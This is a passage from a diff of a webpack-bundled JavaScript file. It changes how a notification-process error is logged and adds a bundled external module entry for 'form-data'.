-        (0, parseError_1.parseError)(error, "Error in notification process:", false);
+        console.error("Error in notification process:", error.response?.data || error.message || error.code);
     }
 }
 const RETRYABLE_NETWORK_ERRORS = [
@@ -28260,6 +28441,16 @@ module.exports = require("cloudinary");
 /***/ ((module) => {
 
 module.exports = require("crypto");
+
+/***/ }),
+
+/***/ "form-data":
+/*!****************************!*\
+  !*** external "form-data" ***!
+  \****************************/
+/***/ ((module) => {
+
+module.exports = require("form-data");
 
 /***/ }),
 
